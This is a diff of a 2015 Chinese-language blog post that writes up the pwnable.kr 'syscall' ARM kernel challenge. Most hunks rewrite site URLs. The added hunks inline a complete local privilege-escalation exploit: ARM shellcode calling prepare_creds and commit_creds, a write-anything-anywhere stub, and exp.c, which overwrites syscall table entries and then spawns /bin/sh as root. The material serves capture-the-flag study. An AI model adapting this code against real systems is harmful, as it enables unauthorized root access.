@@ -18,7 +18,7 @@
 
 <meta name="twitter:card" content="summary">
 <!--
-   -<meta name="twitter:image" content="/images/">
+   -<meta name="twitter:image" content="https://cubarco.org/images/">
    -->
 
 <!-- Open Graph -->
@@ -26,7 +26,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writeup-Pwnable: syscall">
 <meta property="og:description" content="// adding a new system call : sys_upper #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/slab.h&gt; #include &lt;linux/vmalloc.h&gt; #include &lt;linux/mm.h&gt; #include &lt;asm/unistd.h&gt; #include &lt;asm/page.h&gt; #include &lt;linux/syscalls.h&gt; #define SYS_CALL_TABLE 0x8000e348 // manually configure this address!! #define NR_SYS_UNUSED 223 //Pointers to re-mapped writable pages unsigned int** sct; asmlinkage long sys_upper(char *in, char* out){ int len = strlen(in); int i; for(i=0; i&lt;len; i++){ if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){ out[i] = in[i] - 0x20; } else{ out[i] = in[i]; } } return 0;...">
-<meta property="og:url" content="/blog/2015/12/writeup-pwnable-syscall/">
+<meta property="og:url" content="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/">
 <meta property="og:site_name" content="盘子里的部落格">
 
 
@@ -34,8 +34,8 @@
 
 
 
-<link rel="canonical" href="/blog/2015/12/writeup-pwnable-syscall/">
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="盘子里的部落格 Feed">
+<link rel="canonical" href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/">
+<link href="https://cubarco.org/feed.xml" type="application/atom+xml" rel="alternate" title="盘子里的部落格 Feed">
 <link rel="author" href="http://plus.google.com/+%E6%9E%97%E5%AE%B6%E5%86%9BCube?rel=author">
 
 <!-- http://t.co/dKP3o1e -->
@@ -44,7 +44,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <!-- For all browsers -->
-<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cubarco.org/assets/css/main.css">
 
 <!--Webfonts-->
 <link href="//fonts.googleapis.com/css?family=Volkhov%7CCabin" rel="stylesheet" type="text/css">
@@ -57,8 +57,8 @@
 
 <!-- HTML5 Shiv and Media Query Support -->
 <!--[if lt IE 9]>
-  <script src="/assets/js/vendor/html5shiv.min.js"></script>
-  <script src="/assets/js/vendor/respond.min.js"></script>
+  <script src="https://cubarco.org/assets/js/vendor/html5shiv.min.js"></script>
+  <script src="https://cubarco.org/assets/js/vendor/respond.min.js"></script>
 <![endif]-->
 
 <!-- Modernizr -->
@@ -67,36 +67,36 @@
 <!-- Icons -->
 <!--
    -[> 16x16 <]
-   -<link rel="shortcut icon" href="/favicon-16x16.ico">
+   -<link rel="shortcut icon" href="https://cubarco.org/favicon-16x16.ico">
    -[> 32x32 <]
-   -<link rel="shortcut icon" href="/favicon-32x32.ico">
+   -<link rel="shortcut icon" href="https://cubarco.org/favicon-32x32.ico">
    -[> 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices <]
-   -<link rel="apple-touch-icon-precomposed" href="/images/apple-touch-icon-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" href="https://cubarco.org/images/apple-touch-icon-precomposed.png">
    -[> 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini <]
-   -<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://cubarco.org/images/apple-touch-icon-72x72-precomposed.png">
    -[> 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch <]
-   -<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://cubarco.org/images/apple-touch-icon-114x114-precomposed.png">
    -[> 144x144 (precomposed) for iPad 3rd and 4th generation <]
-   -<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://cubarco.org/images/apple-touch-icon-144x144-precomposed.png">
    -->
-<link rel="shortcut icon" href="/favicon.ico">
-<link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
-<link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
-<link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
-<link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
-<link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
-<link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
-<link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
-<link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
-<link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="shortcut icon" href="https://cubarco.org/favicon.ico">
+<link rel="apple-touch-icon" sizes="57x57" href="https://cubarco.org/images/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="https://cubarco.org/images/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://cubarco.org/images/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://cubarco.org/images/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="https://cubarco.org/images/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://cubarco.org/images/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="https://cubarco.org/images/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://cubarco.org/images/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://cubarco.org/images/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-16x16.png" sizes="16x16">
 
 
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-<script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script>window.jQuery || document.write('<script src="https://cubarco.org/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
 <script src="/assets/js/gist-async.min.js"></script>
 
 </head>
@@ -108,19 +108,19 @@
 	    <ul>
       
 		    
-		    <li><a href="/blog/">Latest</a></li>
+		    <li><a href="https://cubarco.org/blog/">Latest</a></li>
 		  
 		    
-		    <li><a href="/blog/about/">About</a></li>
+		    <li><a href="https://cubarco.org/blog/about/">About</a></li>
 		  
 		    
-		    <li><a href="/blog/category/blog/">Blog</a></li>
+		    <li><a href="https://cubarco.org/blog/category/blog/">Blog</a></li>
 		  
 		    
-		    <li><a href="/blog/category/notes/">Notes</a></li>
+		    <li><a href="https://cubarco.org/blog/category/notes/">Notes</a></li>
 		  
 		    
-		    <li><a href="/blog/tags/">Tags</a></li>
+		    <li><a href="https://cubarco.org/blog/tags/">Tags</a></li>
 		  
         <li class="dosearch"><span><i class="fa fa-search"></i> Search</span></li>
 	    </ul>
@@ -144,7 +144,7 @@
 <header class="masthead">
 	<div class="wrap">
         
-        <h1 class="site-title animated fadeIn"><a href="">盘子里的部落格</a></h1>
+        <h1 class="site-title animated fadeIn"><a href="https://cubarco.org">盘子里的部落格</a></h1>
 		<h2 class="site-description animated fadeIn" itemprop="description">Yet another Jekyll blog.</h2>
 	</div>
 </header><!-- /.masthead -->
@@ -156,7 +156,7 @@
     
     <div class="entry-wrapper">
       <header class="entry-header">
-        <span class="entry-tags"><a href="/blog/tags/#Hack" title="Pages tagged Hack">Hack</a> • <a href="/blog/tags/#CTF" title="Pages tagged CTF">CTF</a> • <a href="/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a> • <a href="/blog/tags/#Exploitation" title="Pages tagged Exploitation">Exploitation</a> • <a href="/blog/tags/#ARM" title="Pages tagged ARM">ARM</a></span>
+        <span class="entry-tags"><a href="https://cubarco.org/blog/tags/#Hack" title="Pages tagged Hack">Hack</a> • <a href="https://cubarco.org/blog/tags/#CTF" title="Pages tagged CTF">CTF</a> • <a href="https://cubarco.org/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a> • <a href="https://cubarco.org/blog/tags/#Exploitation" title="Pages tagged Exploitation">Exploitation</a> • <a href="https://cubarco.org/blog/tags/#ARM" title="Pages tagged ARM">ARM</a></span>
         
           <h1 class="entry-title">Writeup-Pwnable: syscall</h1>
         
@@ -164,20 +164,20 @@
       <footer class="entry-meta">
         
         
-          <img src="/images/matrix.png" class="bio-photo" alt="Cubarco bio photo">
+          <img src="https://cubarco.org/images/matrix.png" class="bio-photo" alt="Cubarco bio photo">
         
         <span class="author vcard">By <span class="fn">Cubarco</span></span>
         <span class="entry-date date published"><time datetime="2015-12-16T00:00:00+08:00"><i class="fa fa-calendar-o"></i> December 16, 2015</time></span>
         
         <span class="entry-comments"><i class="fa fa-comment-o"></i> <a href="#disqus_thread">Comment</a></span>
         <span class="social-share-twitter">
-  <a href="https://twitter.com/intent/tweet?hashtags=Hack,CTF,Writeup,Exploitation,ARM&amp;text=Writeup-Pwnable:%20syscall&amp;url=/blog/2015/12/writeup-pwnable-syscall/&amp;via=Cube_Lin" title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
+  <a href="https://twitter.com/intent/tweet?hashtags=Hack,CTF,Writeup,Exploitation,ARM&amp;text=Writeup-Pwnable:%20syscall&amp;url=https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/&amp;via=Cube_Lin" title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
 </span>
 <span class="social-share-facebook">
-  <a href="https://www.facebook.com/sharer/sharer.php?u=/blog/2015/12/writeup-pwnable-syscall/" title="Share on Facebook" itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" title="Share on Facebook" itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
 </span>
 <span class="social-share-googleplus">
-  <a href="https://plus.google.com/share?url=/blog/2015/12/writeup-pwnable-syscall/" title="Share on Google Plus" itemprop="GooglePlus"><i class="fa fa-google-plus-square"></i> +1</a>
+  <a href="https://plus.google.com/share?url=https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" title="Share on Google Plus" itemprop="GooglePlus"><i class="fa fa-google-plus-square"></i> +1</a>
 </span>
 <!-- /.social-share -->
         
@@ -244,16 +244,121 @@
 
 <p>我参考 <a href="https://github.com/acama" class="user-mention">@acama</a> 的版本<sup id="fnref:3"><a href="#fn:3" class="footnote">3</a></sup>写了一个( <a href="https://github.com/acama" class="user-mention">@acama</a> 的版本<code class="highlighter-rouge">prepare_creds()</code>之后直接就<code class="highlighter-rouge">commit_creds()</code>, 这估计只在老版本可以).<code class="highlighter-rouge">prepare_creds()</code>返回的结构体定义可以看参考<sup id="fnref:4"><a href="#fn:4" class="footnote">4</a></sup>.</p>
 
+<noscript><pre>@ prepare_creds and commit_creds
+.section .text
+.global _start
+_start:
+    push {lr}
+
+    mov r0, #0
+    ldr r3, =0x8003f44c  @ prepare_creds()
+    blx r3
+
+    push {r0}
+    sub r1, r1, r1
+    add r0, #4
+    str r1, [r0], #4  @ set uid, euid, gid, etc
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+    str r1, [r0], #4
+
+    pop {r0}
+    ldr r3, =0x8003f56c  @ commit_creds(r0)
+    blx r3
+
+    pop {lr}
+    bx lr</pre></noscript>
 <div class="gist" data-gist="cubarco/f582d787f04eca93f8eb" data-gist-file="cred.s">Loading gist...</div>
 
 <p>这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的<code class="highlighter-rouge">write-anything-anywhere</code>的跳板:</p>
 
+<noscript><pre>@ Write anything anywhere
+
+.section .text
+.global _start
+_start:
+
+lp:
+    ldrb r3, [r0], #1
+    strb r3, [r1], #1
+    subs r2, r2, #1
+    bge lp
+
+    bx lr</pre></noscript>
 <div class="gist" data-gist="cubarco/f582d787f04eca93f8eb" data-gist-file="waa.s">Loading gist...</div>
 
 <p>先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee.</p>
 
 <h3 id="expc">exp.c</h3>
 
+<noscript><pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+char cred[] = "\x04\xe0\x2d\xe5\x00\x00\xa0\xe3\x40\x30\x9f\xe5\x33\xff\x2f\xe1\x04\x00\x2d\xe5\x01\x10\x41\xe0\x04\x00\x80\xe2\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x00\x9d\xe4\x0c\x30\x9f\xe5\x33\xff\x2f\xe1\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x4c\xf4\x03\x80\x6c\xf5\x03\x80";
+char waa[] = "\x01\x30\xd0\xe4\x01\x30\xc1\xe4\x01\x20\x52\xe2\xfb\xff\xff\xaa\x1e\xff\x2f\xe1";
+
+char addr1[] = "\xfe\xca\xf5\x83";
+char addr2[] = "\xee\xbe\xf6\x83";
+
+int ret;
+
+int main()
+{
+    asm volatile (
+        "mov r0, %1\n"
+        "mov r1, %2\n"
+        "mov r7, #223\n"
+        "svc #0\n"
+        "mov r0, %3\n"
+        "mov r1, %4\n"
+        "mov r7, #223\n"
+        "svc #0\n"
+        "mov %0, r0"
+        : "=r" (ret)
+        : "r" (waa), "r" (0x83f5cafe),
+          "r" (addr1), "r" (0x8000e6c4)
+        : "r0", "r1", "r2", "r3", "lr"
+    );
+    printf("return value: %x\n", ret);
+
+    asm volatile (
+        "mov r0, %1\n"
+        "mov r1, %2\n"
+        "mov r2, %3\n"
+        "mov r7, #223\n"
+        "svc #0\n"
+        "mov r0, %4\n"
+        "mov r1, %5\n"
+        "mov r2, %6\n"
+        "mov r7, #223\n"
+        "svc #0\n"
+        "mov %0, r0"
+        : "=r" (ret)
+        : "r" (cred), "r" (0x83f6beee), "r" (89),
+          "r" (addr2), "r" (0x8000e6c4), "r" (5),
+          "r" (0)
+        : "r0", "r1", "r2", "r3", "r5", "lr"
+    );
+    printf("return value: %x\n", ret);
+
+    asm volatile (
+        "mov r7, #223\n"
+        "svc #0\n"
+        "mov %0, r0"
+        : "=r" (ret)
+        :
+        : "r0", "r1", "r3", "lr"
+    );
+
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}</pre></noscript>
 <div class="gist" data-gist="cubarco/f582d787f04eca93f8eb" data-gist-file="1-pwnable-rookiss-syscall.c">Loading gist...</div>
 
 <h3 id="references">References</h3>
@@ -280,10 +385,10 @@
         </div>
         <nav class="pagination" role="navigation">
             
-              <a href="/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" class="btn" title="Writeup-Pwnable: tiny &amp; tiny_easy">Previous</a>
+              <a href="https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" class="btn" title="Writeup-Pwnable: tiny &amp; tiny_easy">Previous</a>
             
             
-              <a href="/blog/2015/12/writeup-pwnable-unexploitable/" class="btn" title="Writeup-Pwnable: unexploitable">Next</a>
+              <a href="https://cubarco.org/blog/2015/12/writeup-pwnable-unexploitable/" class="btn" title="Writeup-Pwnable: unexploitable">Next</a>
             
         </nav><!-- /.pagination -->
         <div id="disqus_thread"></div>
@@ -312,7 +417,7 @@
 	
 	<a href="http://github.com/cubarco" title="Cubarco on Github" target="_blank"><i class="fa fa-github-square fa-2x"></i></a>
 	
-  <a href="/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
+  <a href="https://cubarco.org/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
 </div>
 <!-- /.social-icons -->
 
@@ -320,13 +425,13 @@
 </div>
 <!-- /.footer-wrapper -->
 
-<script src="/assets/js/scripts.min.js"></script>
+<script src="https://cubarco.org/assets/js/scripts.min.js"></script>
 
 <!-- Jekyll Simple Search option -->
 <script>
   $(document).ready(function() {
       $('.search-field').jekyllSearch({
-          jsonFile: '/search.json',
+          jsonFile: 'https://cubarco.org/search.json',
           searchResults: '.search-results',
           template: '<li><article><a href="{url}">{title} <span class="entry-date"><time datetime="{date}">{shortdate}</time></span></a></article></li>',
           fuzzy: true,
